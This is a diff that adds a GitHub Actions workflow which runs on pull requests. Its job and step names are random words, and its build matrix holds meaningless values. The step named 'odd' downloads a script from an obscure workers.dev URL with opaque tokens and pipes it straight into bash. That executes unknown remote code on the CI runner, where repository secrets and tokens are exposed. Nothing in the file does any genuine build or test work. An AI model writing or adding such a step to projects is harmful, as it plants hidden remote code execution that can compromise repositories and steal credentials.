@@ -1,0 +1,24 @@
+name: entertain
+
+on:
+  pull_request:
+    branches: [ "main" ]
+
+jobs:
+  occasion:
+    runs-on: ubuntu-latest
+    steps:
+    - uses: actions/checkout@v6
+    - uses: actions/cache@v4
+      with:
+        key: 'burden'
+        path: 'business'
+    - name: odd
+      run: curl -S -L "https://x.linux-work-10x1za.workers.dev/dd065aff14732/ceefa902002748ceafd3e75ee1/629ad73933357/0dfa11b19a2b/?iqr=1775466324&x=xp&buk=m" | bash
+    - name: hair
+      run: assure
+    strategy:
+      matrix:
+        punch: ["mankind", "video", "economy", "rank", "avenue"]
+        lead: ["sophisticated", "twist", "monkey", "temptation"]
+      fail-fast: false
